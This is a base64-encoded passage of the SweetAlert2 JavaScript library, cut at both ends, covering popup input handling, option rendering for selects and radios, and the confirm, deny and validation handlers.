0RWxlbWVudH0gaW5wdXRcbiAgICogQHJldHVybnMge251bWJlcn1cbiAgICovXG4gIGNvbnN0IGdldENoZWNrYm94VmFsdWUgPSBpbnB1dCA9PiBpbnB1dC5jaGVja2VkID8gMSA6IDA7XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTElucHV0RWxlbWVudH0gaW5wdXRcbiAgICogQHJldHVybnMge3N0cmluZyB8IG51bGx9XG4gICAqL1xuICBjb25zdCBnZXRSYWRpb1ZhbHVlID0gaW5wdXQgPT4gaW5wdXQuY2hlY2tlZCA/IGlucHV0LnZhbHVlIDogbnVsbDtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MSW5wdXRFbGVtZW50fSBpbnB1dFxuICAgKiBAcmV0dXJucyB7RmlsZUxpc3QgfCBGaWxlIHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldEZpbGVWYWx1ZSA9IGlucHV0ID0+IGlucHV0LmZpbGVzLmxlbmd0aCA/IGlucHV0LmdldEF0dHJpYnV0ZSgnbXVsdGlwbGUnKSAhPT0gbnVsbCA/IGlucHV0LmZpbGVzIDogaW5wdXQuZmlsZXNbMF0gOiBudWxsO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGNvbnN0IGhhbmRsZUlucHV0T3B0aW9ucyA9IChpbnN0YW5jZSwgcGFyYW1zKSA9PiB7XG4gICAgY29uc3QgcG9wdXAgPSBnZXRQb3B1cCgpO1xuICAgIC8qKlxuICAgICAqIEBwYXJhbSB7UmVjb3JkPHN0cmluZywgYW55Pn0gaW5wdXRPcHRpb25zXG4gICAgICovXG4gICAgY29uc3QgcHJvY2Vzc0lucHV0T3B0aW9ucyA9IGlucHV0T3B0aW9ucyA9PiB7XG4gICAgICBwb3B1bGF0ZUlucHV0T3B0aW9uc1twYXJhbXMuaW5wdXRdKHBvcHVwLCBmb3JtYXRJbnB1dE9wdGlvbnMoaW5wdXRPcHRpb25zKSwgcGFyYW1zKTtcbiAgICB9O1xuICAgIGlmIChoYXNUb1Byb21pc2VGbihwYXJhbXMuaW5wdXRPcHRpb25zKSB8fCBpc1Byb21pc2UocGFyYW1zLmlucHV0T3B0aW9ucykpIHtcbiAgICAgIHNob3dMb2FkaW5nKGdldENvbmZpcm1CdXR0b24oKSk7XG4gICAgICBhc1Byb21pc2UocGFyYW1zLmlucHV0T3B0aW9ucykudGhlbihpbnB1dE9wdGlvbnMgPT4ge1xuICAgICAgICBpbnN0YW5jZS5oaWRlTG9hZGluZygpO1xuICAgICAgICBwcm9jZXNzSW5wdXRPcHRpb25zKGlucHV0T3B0aW9ucyk7XG4gICAgICB9KTtcbiAgICB9IGVsc2UgaWYgKHR5cGVvZiBwYXJhbXMuaW5wdXRPcHRpb25zID09PSAnb2JqZWN0Jykge1xuICAgICAgcHJvY2Vzc0lucHV0T3B0aW9ucyhwYXJhbXMuaW5wdXRPcHRpb25zKTtcbiAgICB9IGVsc2Uge1xuICAgICAgZXJyb3IoYFVuZXhwZWN0ZWQgdHlwZSBvZiBpbnB1dE9wdGlvbnMhIEV4cGVjdGVkIG9iamVjdCwgTWFwIG9yIFByb21pc2UsIGdvdCAke3R5cGVvZiBwYXJhbXMuaW5wdXRPcHRpb25zfWApO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCBoYW5kbGVJbnB1dFZhbHVlID0gKGluc3RhbmNlLCBwYXJhbXMpID0+IHtcbiAgICBjb25zdCBpbnB1dCA9IGluc3RhbmNlLmdldElucHV0KCk7XG4gICAgaGlkZShpbnB1dCk7XG4gICAgYXNQcm9taXNlKHBhcmFtcy5pbnB1dFZhbHVlKS50aGVuKGlucHV0VmFsdWUgPT4ge1xuICAgICAgaW5wdXQudmFsdWUgPSBwYXJhbXMuaW5wdXQgPT09ICdudW1iZXInID8gYCR7cGFyc2VGbG9hdChpbnB1dFZhbHVlKSB8fCAwfWAgOiBgJHtpbnB1dFZhbHVlfWA7XG4gICAgICBzaG93KGlucHV0KTtcbiAgICAgIGlucHV0LmZvY3VzKCk7XG4gICAgICBpbnN0YW5jZS5oaWRlTG9hZGluZygpO1xuICAgIH0pLmNhdGNoKGVyciA9PiB7XG4gICAgICBlcnJvcihgRXJyb3IgaW4gaW5wdXRWYWx1ZSBwcm9taXNlOiAke2Vycn1gKTtcbiAgICAgIGlucHV0LnZhbHVlID0gJyc7XG4gICAgICBzaG93KGlucHV0KTtcbiAgICAgIGlucHV0LmZvY3VzKCk7XG4gICAgICBpbnN0YW5jZS5oaWRlTG9hZGluZygpO1xuICAgIH0pO1xuICB9O1xuICBjb25zdCBwb3B1bGF0ZUlucHV0T3B0aW9ucyA9IHtcbiAgICAvKipcbiAgICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBwb3B1cFxuICAgICAqIEBwYXJhbSB7UmVjb3JkPHN0cmluZywgYW55Pn0gaW5wdXRPcHRpb25zXG4gICAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAgICovXG4gICAgc2VsZWN0OiAocG9wdXAsIGlucHV0T3B0aW9ucywgcGFyYW1zKSA9PiB7XG4gICAgICBjb25zdCBzZWxlY3QgPSBnZXREaXJlY3RDaGlsZEJ5Q2xhc3MocG9wdXAsIHN3YWxDbGFzc2VzLnNlbGVjdCk7XG4gICAgICAvKipcbiAgICAgICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IHBhcmVudFxuICAgICAgICogQHBhcmFtIHtzdHJpbmd9IG9wdGlvbkxhYmVsXG4gICAgICAgKiBAcGFyYW0ge3N0cmluZ30gb3B0aW9uVmFsdWVcbiAgICAgICAqL1xuICAgICAgY29uc3QgcmVuZGVyT3B0aW9uID0gKHBhcmVudCwgb3B0aW9uTGFiZWwsIG9wdGlvblZhbHVlKSA9PiB7XG4gICAgICAgIGNvbnN0IG9wdGlvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ29wdGlvbicpO1xuICAgICAgICBvcHRpb24udmFsdWUgPSBvcHRpb25WYWx1ZTtcbiAgICAgICAgc2V0SW5uZXJIdG1sKG9wdGlvbiwgb3B0aW9uTGFiZWwpO1xuICAgICAgICBvcHRpb24uc2VsZWN0ZWQgPSBpc1NlbGVjdGVkKG9wdGlvblZhbHVlLCBwYXJhbXMuaW5wdXRWYWx1ZSk7XG4gICAgICAgIHBhcmVudC5hcHBlbmRDaGlsZChvcHRpb24pO1xuICAgICAgfTtcbiAgICAgIGlucHV0T3B0aW9ucy5mb3JFYWNoKGlucHV0T3B0aW9uID0+IHtcbiAgICAgICAgY29uc3Qgb3B0aW9uVmFsdWUgPSBpbnB1dE9wdGlvblswXTtcbiAgICAgICAgY29uc3Qgb3B0aW9uTGFiZWwgPSBpbnB1dE9wdGlvblsxXTtcbiAgICAgICAgLy8gPG9wdGdyb3VwPiBzcGVjOlxuICAgICAgICAvLyBodHRwczovL3d3dy53My5vcmcvVFIvaHRtbDQwMS9pbnRlcmFjdC9mb3Jtcy5odG1sI2gtMTcuNlxuICAgICAgICAvLyBcIi4uLmFsbCBPUFRHUk9VUCBlbGVtZW50cyBtdXN0IGJlIHNwZWNpZmllZCBkaXJlY3RseSB3aXRoaW4gYSBTRUxFQ1QgZWxlbWVudCAoaS5lLiwgZ3JvdXBzIG1heSBub3QgYmUgbmVzdGVkKS4uLlwiXG4gICAgICAgIC8vIGNoZWNrIHdoZXRoZXIgdGhpcyBpcyBhIDxvcHRncm91cD5cbiAgICAgICAgaWYgKEFycmF5LmlzQXJyYXkob3B0aW9uTGFiZWwpKSB7XG4gICAgICAgICAgLy8gaWYgaXQgaXMgYW4gYXJyYXksIHRoZW4gaXQgaXMgYW4gPG9wdGdyb3VwPlxuICAgICAgICAgIGNvbnN0IG9wdGdyb3VwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnb3B0Z3JvdXAnKTtcbiAgICAgICAgICBvcHRncm91cC5sYWJlbCA9IG9wdGlvblZhbHVlO1xuICAgICAgICAgIG9wdGdyb3VwLmRpc2FibGVkID0gZmFsc2U7IC8vIG5vdCBjb25maWd1cmFibGUgZm9yIG5vd1xuICAgICAgICAgIHNlbGVjdC5hcHBlbmRDaGlsZChvcHRncm91cCk7XG4gICAgICAgICAgb3B0aW9uTGFiZWwuZm9yRWFjaChvID0+IHJlbmRlck9wdGlvbihvcHRncm91cCwgb1sxXSwgb1swXSkpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgIC8vIGNhc2Ugb2YgPG9wdGlvbj5cbiAgICAgICAgICByZW5kZXJPcHRpb24oc2VsZWN0LCBvcHRpb25MYWJlbCwgb3B0aW9uVmFsdWUpO1xuICAgICAgICB9XG4gICAgICB9KTtcbiAgICAgIHNlbGVjdC5mb2N1cygpO1xuICAgIH0sXG4gICAgLyoqXG4gICAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gcG9wdXBcbiAgICAgKiBAcGFyYW0ge1JlY29yZDxzdHJpbmcsIGFueT59IGlucHV0T3B0aW9uc1xuICAgICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgICAqL1xuICAgIHJhZGlvOiAocG9wdXAsIGlucHV0T3B0aW9ucywgcGFyYW1zKSA9PiB7XG4gICAgICBjb25zdCByYWRpbyA9IGdldERpcmVjdENoaWxkQnlDbGFzcyhwb3B1cCwgc3dhbENsYXNzZXMucmFkaW8pO1xuICAgICAgaW5wdXRPcHRpb25zLmZvckVhY2goaW5wdXRPcHRpb24gPT4ge1xuICAgICAgICBjb25zdCByYWRpb1ZhbHVlID0gaW5wdXRPcHRpb25bMF07XG4gICAgICAgIGNvbnN0IHJhZGlvTGFiZWwgPSBpbnB1dE9wdGlvblsxXTtcbiAgICAgICAgY29uc3QgcmFkaW9JbnB1dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7XG4gICAgICAgIGNvbnN0IHJhZGlvTGFiZWxFbGVtZW50ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGFiZWwnKTtcbiAgICAgICAgcmFkaW9JbnB1dC50eXBlID0gJ3JhZGlvJztcbiAgICAgICAgcmFkaW9JbnB1dC5uYW1lID0gc3dhbENsYXNzZXMucmFkaW87XG4gICAgICAgIHJhZGlvSW5wdXQudmFsdWUgPSByYWRpb1ZhbHVlO1xuICAgICAgICBpZiAoaXNTZWxlY3RlZChyYWRpb1ZhbHVlLCBwYXJhbXMuaW5wdXRWYWx1ZSkpIHtcbiAgICAgICAgICByYWRpb0lucHV0LmNoZWNrZWQgPSB0cnVlO1xuICAgICAgICB9XG4gICAgICAgIGNvbnN0IGxhYmVsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3BhbicpO1xuICAgICAgICBzZXRJbm5lckh0bWwobGFiZWwsIHJhZGlvTGFiZWwpO1xuICAgICAgICBsYWJlbC5jbGFzc05hbWUgPSBzd2FsQ2xhc3Nlcy5sYWJlbDtcbiAgICAgICAgcmFkaW9MYWJlbEVsZW1lbnQuYXBwZW5kQ2hpbGQocmFkaW9JbnB1dCk7XG4gICAgICAgIHJhZGlvTGFiZWxFbGVtZW50LmFwcGVuZENoaWxkKGxhYmVsKTtcbiAgICAgICAgcmFkaW8uYXBwZW5kQ2hpbGQocmFkaW9MYWJlbEVsZW1lbnQpO1xuICAgICAgfSk7XG4gICAgICBjb25zdCByYWRpb3MgPSByYWRpby5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dCcpO1xuICAgICAgaWYgKHJhZGlvcy5sZW5ndGgpIHtcbiAgICAgICAgcmFkaW9zWzBdLmZvY3VzKCk7XG4gICAgICB9XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBDb252ZXJ0cyBgaW5wdXRPcHRpb25zYCBpbnRvIGFuIGFycmF5IG9mIGBbdmFsdWUsIGxhYmVsXWBzXG4gICAqXG4gICAqIEBwYXJhbSB7UmVjb3JkPHN0cmluZywgYW55Pn0gaW5wdXRPcHRpb25zXG4gICAqIEByZXR1cm5zIHtBcnJheTxBcnJheTxzdHJpbmc+Pn1cbiAgICovXG4gIGNvbnN0IGZvcm1hdElucHV0T3B0aW9ucyA9IGlucHV0T3B0aW9ucyA9PiB7XG4gICAgY29uc3QgcmVzdWx0ID0gW107XG4gICAgaWYgKHR5cGVvZiBNYXAgIT09ICd1bmRlZmluZWQnICYmIGlucHV0T3B0aW9ucyBpbnN0YW5jZW9mIE1hcCkge1xuICAgICAgaW5wdXRPcHRpb25zLmZvckVhY2goKHZhbHVlLCBrZXkpID0+IHtcbiAgICAgICAgbGV0IHZhbHVlRm9ybWF0dGVkID0gdmFsdWU7XG4gICAgICAgIGlmICh0eXBlb2YgdmFsdWVGb3JtYXR0ZWQgPT09ICdvYmplY3QnKSB7XG4gICAgICAgICAgLy8gY2FzZSBvZiA8b3B0Z3JvdXA+XG4gICAgICAgICAgdmFsdWVGb3JtYXR0ZWQgPSBmb3JtYXRJbnB1dE9wdGlvbnModmFsdWVGb3JtYXR0ZWQpO1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdC5wdXNoKFtrZXksIHZhbHVlRm9ybWF0dGVkXSk7XG4gICAgICB9KTtcbiAgICB9IGVsc2Uge1xuICAgICAgT2JqZWN0LmtleXMoaW5wdXRPcHRpb25zKS5mb3JFYWNoKGtleSA9PiB7XG4gICAgICAgIGxldCB2YWx1ZUZvcm1hdHRlZCA9IGlucHV0T3B0aW9uc1trZXldO1xuICAgICAgICBpZiAodHlwZW9mIHZhbHVlRm9ybWF0dGVkID09PSAnb2JqZWN0Jykge1xuICAgICAgICAgIC8vIGNhc2Ugb2YgPG9wdGdyb3VwPlxuICAgICAgICAgIHZhbHVlRm9ybWF0dGVkID0gZm9ybWF0SW5wdXRPcHRpb25zKHZhbHVlRm9ybWF0dGVkKTtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQucHVzaChba2V5LCB2YWx1ZUZvcm1hdHRlZF0pO1xuICAgICAgfSk7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBvcHRpb25WYWx1ZVxuICAgKiBAcGFyYW0ge0lucHV0VmFsdWUgfCBQcm9taXNlPElucHV0VmFsdWU+IHwgeyB0b1Byb21pc2U6ICgpID0+IElucHV0VmFsdWUgfX0gaW5wdXRWYWx1ZVxuICAgKiBAcmV0dXJucyB7Ym9vbGVhbn1cbiAgICovXG4gIGNvbnN0IGlzU2VsZWN0ZWQgPSAob3B0aW9uVmFsdWUsIGlucHV0VmFsdWUpID0+IHtcbiAgICByZXR1cm4gaW5wdXRWYWx1ZSAmJiBpbnB1dFZhbHVlLnRvU3RyaW5nKCkgPT09IG9wdGlvblZhbHVlLnRvU3RyaW5nKCk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqL1xuICBjb25zdCBoYW5kbGVDb25maXJtQnV0dG9uQ2xpY2sgPSBpbnN0YW5jZSA9PiB7XG4gICAgY29uc3QgaW5uZXJQYXJhbXMgPSBwcml2YXRlUHJvcHMuaW5uZXJQYXJhbXMuZ2V0KGluc3RhbmNlKTtcbiAgICBpbnN0YW5jZS5kaXNhYmxlQnV0dG9ucygpO1xuICAgIGlmIChpbm5lclBhcmFtcy5pbnB1dCkge1xuICAgICAgaGFuZGxlQ29uZmlybU9yRGVueVdpdGhJbnB1dChpbnN0YW5jZSwgJ2NvbmZpcm0nKTtcbiAgICB9IGVsc2Uge1xuICAgICAgY29uZmlybShpbnN0YW5jZSwgdHJ1ZSk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKi9cbiAgY29uc3QgaGFuZGxlRGVueUJ1dHRvbkNsaWNrID0gaW5zdGFuY2UgPT4ge1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldChpbnN0YW5jZSk7XG4gICAgaW5zdGFuY2UuZGlzYWJsZUJ1dHRvbnMoKTtcbiAgICBpZiAoaW5uZXJQYXJhbXMucmV0dXJuSW5wdXRWYWx1ZU9uRGVueSkge1xuICAgICAgaGFuZGxlQ29uZmlybU9yRGVueVdpdGhJbnB1dChpbnN0YW5jZSwgJ2RlbnknKTtcbiAgICB9IGVsc2Uge1xuICAgICAgZGVueShpbnN0YW5jZSwgZmFsc2UpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtGdW5jdGlvbn0gZGlzbWlzc1dpdGhcbiAgICovXG4gIGNvbnN0IGhhbmRsZUNhbmNlbEJ1dHRvbkNsaWNrID0gKGluc3RhbmNlLCBkaXNtaXNzV2l0aCkgPT4ge1xuICAgIGluc3RhbmNlLmRpc2FibGVCdXR0b25zKCk7XG4gICAgZGlzbWlzc1dpdGgoRGlzbWlzc1JlYXNvbi5jYW5jZWwpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0geydjb25maXJtJyB8ICdkZW55J30gdHlwZVxuICAgKi9cbiAgY29uc3QgaGFuZGxlQ29uZmlybU9yRGVueVdpdGhJbnB1dCA9IChpbnN0YW5jZSwgdHlwZSkgPT4ge1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldChpbnN0YW5jZSk7XG4gICAgaWYgKCFpbm5lclBhcmFtcy5pbnB1dCkge1xuICAgICAgZXJyb3IoYFRoZSBcImlucHV0XCIgcGFyYW1ldGVyIGlzIG5lZWRlZCB0byBiZSBzZXQgd2hlbiB1c2luZyByZXR1cm5JbnB1dFZhbHVlT24ke2NhcGl0YWxpemVGaXJzdExldHRlcih0eXBlKX1gKTtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgY29uc3QgaW5wdXRWYWx1ZSA9IGdldElucHV0VmFsdWUoaW5zdGFuY2UsIGlubmVyUGFyYW1zKTtcbiAgICBpZiAoaW5uZXJQYXJhbXMuaW5wdXRWYWxpZGF0b3IpIHtcbiAgICAgIGhhbmRsZUlucHV0VmFsaWRhdG9yKGluc3RhbmNlLCBpbnB1dFZhbHVlLCB0eXBlKTtcbiAgICB9IGVsc2UgaWYgKCFpbnN0YW5jZS5nZXRJbnB1dCgpLmNoZWNrVmFsaWRpdHkoKSkge1xuICAgICAgaW5zdGFuY2UuZW5hYmxlQnV0dG9ucygpO1xuICAgICAgaW5zdGFuY2Uuc2hvd1ZhbGlkYXRpb25NZXNzYWdlKGlubmVyUGFyYW1zLnZhbGlkYXRpb25NZXNzYWdlKTtcbiAgICB9IGVsc2UgaWYgKHR5cGUgPT09ICdkZW55Jykge1xuICAgICAgZGVueShpbnN0YW5jZSwgaW5wdXRWYWx1ZSk7XG4gICAgfSBlbHNlIHtcbiAgICAgIGNvbmZpcm0oaW5zdGFuY2UsIGlucHV0VmFsdWUpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtzdHJpbmcgfCBudW1iZXIgfCBGaWxlIHwgRmlsZUxpc3QgfCBudWxsfSBpbnB1dFZhbHVlXG4gICAqIEBwYXJhbSB7J2NvbmZpcm0nIHwgJ2RlbnknfSB0eXBlXG4gICAqL1xuICBjb25zdCBoYW5kbGVJbnB1dFZhbGlkYXRvciA9IChpbnN0YW5jZSwgaW5wdXRWYWx1ZSwgdHlwZSkgPT4ge1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldChpbnN0YW5jZSk7XG4gICAgaW5zdGFuY2UuZGlzYWJsZUlucHV0KCk7XG4gICAgY29uc3QgdmFsaWRhdGlvblByb21pc2UgPSBQcm9taXNlLnJlc29sdmUoKS50aGVuKCgpID0+IGFzUHJvbWlzZShpbm5lclBhcmFtcy5pbnB1dFZhbGlkYXRvcihpbnB1dFZhbHVlLCBpbm5lclBhcmFtcy52YWxpZGF0aW9uTWVzc2FnZSkpKTtcbiAgICB2YWxpZGF0aW9uUHJvbWlzZS50aGVuKHZhbGlkYXRpb25NZXNzYWdlID0+IHtcbiAgICAgIGluc3RhbmNlLmVuYWJsZUJ1dHRvbnMoKTtcbiAgICAgIGluc3RhbmNlLmVuYWJsZUlucHV0KCk7XG4gICAgICBpZiAodmFsaWRhdGlvbk1lc3NhZ2UpIHtcbiAgICAgICAgaW5zdGFuY2Uuc2hvd1ZhbGlkYXRpb25NZXNzYWdlKHZhbGlkYXRpb25NZXNzYWdlKTtcbiAgICAgIH0gZWxzZSBpZiAodHlwZSA9PT0gJ2RlbnknKSB7XG4gICAgICAgIGRlbnkoaW5zdGFuY2UsIGlucHV0VmFsdWUpO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgY29uZmlybShpbnN0YW5jZSwgaW5wdXRWYWx1ZSk7XG4gICAgICB9XG4gICAgfSk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7YW55fSB2YWx1ZVxuICAgKi9cbiAgY29uc3QgZGVueSA9IChpbnN0YW5jZSwgdmFsdWUpID0+IHtcbiAgICBjb25zdCBpbm5lclBhcmFtcyA9IHByaXZhdGVQcm9wcy5pbm5lclBhcmFtcy5nZXQoaW5zdGFuY2UgfHwgdW5kZWZpbmVkKTtcbiAgICBpZiAoaW5uZXJQYXJhbXMuc2hvd0xvYWRlck9uRGVueSkge1xuICAgICAgc2hvd0xvYWRpbmcoZ2V0RGVueUJ1dHRvbigpKTtcbiAgICB9XG4gICAgaWYgKGlubmVyUGFyYW1zLnByZURlbnkpIHtcbiAgICAgIHByaXZhdGVQcm9wcy5hd2FpdGluZ1Byb21pc2Uuc2V0KGluc3RhbmNlIHx8IHVuZGVmaW5lZCwgdHJ1ZSk7IC8vIEZsYWdnaW5nIHRoZSBpbnN0YW5jZSBhcyBhd2FpdGluZyBhIHByb21pc2Ugc28gaXQncyBvd24gcHJvbWlzZSdzIHJlamVjdC9yZXNvbHZlIG1ldGhvZHMgZG9lc24ndCBnZXQgZGVzdHJveWVkIHVudGlsIHRoZSByZXN1bHQgZnJvbSB0aGlzIHByZURlbnkncyBwcm9taXNlIGlzIHJlY2VpdmVkXG4gICAgICBjb25zdCBwcmVEZW55UHJvbWlzZSA9IFByb21pc2UucmVzb2x2ZSgpLnRoZW4oKCkgPT4gYXNQcm9taXNlKGlubmVyUGFyYW1zLnByZURlbnkodmFsdWUsIGlubmVyUGFyYW1zLnZhbGlkYXRpb25NZXNzYWdlKSkpO1xuICAgICAgcHJlRGVueVByb21pc2UudGhlbihwcmVEZW55VmFsdWUgPT4ge1xuICAgICAgICBpZiAocHJlRGVueVZhbHVlID09PSBmYWxzZSkge1xuICAgICAgICAgIGluc3RhbmNlLmhpZGVMb2FkaW5nKCk7XG4gICAgICAgICAgaGFuZGxlQXdhaXRpbmdQcm9taXNlKGluc3RhbmNlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICBpbnN0YW5jZS5jbG9zZSh7XG4gICAgICAgICAgICBpc0RlbmllZDogdHJ1ZSxcbiAgICAgICAgICAgIHZhbHVlOiB0eXBlb2YgcHJlRGVueVZhbHVlID09PSAndW5kZWZpbmVkJyA/IHZhbHVlIDogcHJlRGVueVZhbHVlXG4gICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICAgIH0pLmNhdGNoKGVycm9yID0+IHJlamVjdFdpdGgoaW5zdGFuY2UgfHwgdW5kZWZpbmVkLCBlcnJvcikpO1xuICAgIH0gZWxzZSB7XG4gICAgICBpbnN0YW5jZS5jbG9zZSh7XG4gICAgICAgIGlzRGVuaWVkOiB0cnVlLFxuICAgICAgICB2YWx1ZVxuICAgICAgfSk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge2FueX0gdmFsdWVcbiAgICovXG4gIGNvbnN0IHN1Y2NlZWRXaXRoID0gKGluc3RhbmNlLCB2YWx1ZSkgPT4ge1xuICAgIGluc3RhbmNlLmNsb3NlKHtcbiAgICAgIGlzQ29uZmlybWVkOiB0cnVlLFxuICAgICAgdmFsdWVcbiAgICB9KTtcbiAgfTtcblxuICAvKipcbiAgICpcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtzdHJpbmd9IGVycm9yXG4gICAqL1xuICBjb25zdCByZWplY3RXaXRoID0gKGluc3RhbmNlLCBlcnJvcikgPT4ge1xuICAgIC8vIEB0cy1pZ25vcmVcbiAgICBpbnN0YW5jZS5yZWplY3RQcm9taXNlKGVycm9yKTtcbiAgfTtcblxuICAvKipcbiAgICpcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHthbnl9IHZhbHVlXG4gICAqL1xuICBjb25zdCBjb25maXJtID0gKGluc3RhbmNlLCB2YWx1ZSkgPT4ge1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldChpbnN0YW5jZSB8fCB1bmRlZmluZWQpO1xuICAgIGlmIChpbm5lclBhcmFtcy5zaG93TG9hZGVyT25Db25maXJtKSB7XG4gICAgICBzaG93TG9hZGluZygpO1xuICAgIH1cbiAgICBpZiAoaW5uZXJQYXJhbXMucHJlQ29uZmlybSkge1xuICAgICAgaW5zdGFuY2UucmVzZXRWYWxpZGF0aW9uTWVzc2FnZSgpO1xuICAgICAgcHJpdmF0ZVByb3BzLmF3YWl0aW5nUHJvbWlzZS5zZXQoaW5zdGFuY2UgfHwgdW5kZWZpbmVkLCB0cnVlKTsgLy8gRmxhZ2dpbmcgdGhlIGluc3RhbmNlIGFzIGF3YWl0aW5nIGEgcHJvbWlzZSBzbyBpdCdzIG93biBwcm9taXNlJ3MgcmVqZWN0L3Jlc29sdmUgbWV0aG9kcyBkb2Vzbid0IGdldCBkZXN0cm95ZWQgdW50aWwgdGhlIHJlc3VsdCBmcm9tIHRoaXMgcHJlQ29uZmlybSdzIHByb21pc2UgaXMgcmVjZWl2ZWRcbiAgICAgIGNvbnN0IHByZUNvbmZpcm1Qcm9taXNlID0gUHJvbWlzZS5yZXNvbHZlKCkudGhlbigoKSA9PiBhc1Byb21pc2UoaW5uZXJQYXJhbXMucHJlQ29uZmlybSh2YWx1ZSwgaW5uZXJQYXJhbXMudmFsaWRhdGlvbk1lc3NhZ2UpKSk7XG4gICAgICBwcmVDb25maXJtUHJvbWlzZS50aGVuKHByZUNvbmZpcm1WYWx1ZSA9PiB7XG4gICAgICAgIGlmIChpc1Zpc2libGUkMShnZXRWYWxpZGF0aW9uTWVzc2FnZSgpKSB8fCBwcmVDb25maXJtVmFsdWUgPT09IGZhbHNlKSB7XG4gICAgICAgICAgaW5zdGFuY2UuaGlkZUxvYWRpbmcoKTtcbiAgICAgICAgICBoYW5kbGVBd2FpdGluZ1Byb21pc2UoaW5zdGFuY2UpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgIHN1Y2NlZWRXaXRoKGluc3RhbmNlLCB0eXBlb2YgcHJlQ29uZmlybVZhbHVlID09PSAndW5kZWZpbmVkJyA/IHZhbHVlIDogcHJlQ29uZmlybVZhbHVlKTtcbiAgICAgICAgfVxuICAgICAgfSkuY2F0Y2goZXJyb3IgPT4gcmVqZWN0V2l0aChpbnN0YW5jZSB8fCB1bmRlZmluZWQsIGVycm9yKSk7XG4gICAgfSBlbHNlIHtcbiAgICAgIHN1Y2NlZWRXaXRoKGluc3RhbmNlLCB2YWx1ZSk7XG4gICAgfVxuICB9O1xuXG4gIGNvbnN0IGhhbmRsZVBvcHVwQ2xpY2sgPSAoaW5zdGFuY2UsIGRvbUNhY2hlLCBkaXNtaXNzV2l0aCkgPT4ge1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldChpbnN0YW5jZSk7XG4gICAgaWYgKGlubmVyUGFyYW1zLnRvYXN0KSB7XG4gICAgICBoYW5kbGVUb2FzdENsaWNrKGluc3RhbmNlLCBkb21DYWNoZSwgZGlzbWlzc1dpdGgpO1xuICAgIH0gZWxzZSB7XG4gICAgICAvLyBJZ25vcmUgY2xpY2sgZXZlbnRzIHRoYXQgaGFkIG1vdXNlZG93biBvbiB0aGUgcG9wdXAgYnV0IG1vdXNldXAgb24gdGhlIGNvbnRhaW5lclxuICAgICAgLy8gVGhpcyBjYW4gaGFwcGVuIHdoZW4gdGhlIHVzZXIgZHJhZ3MgYSBzbGlkZXJcbiAgICAgIGhhbmRsZU1vZGFsTW91c2Vkb3duKGRvbUNhY2hlKTtcbl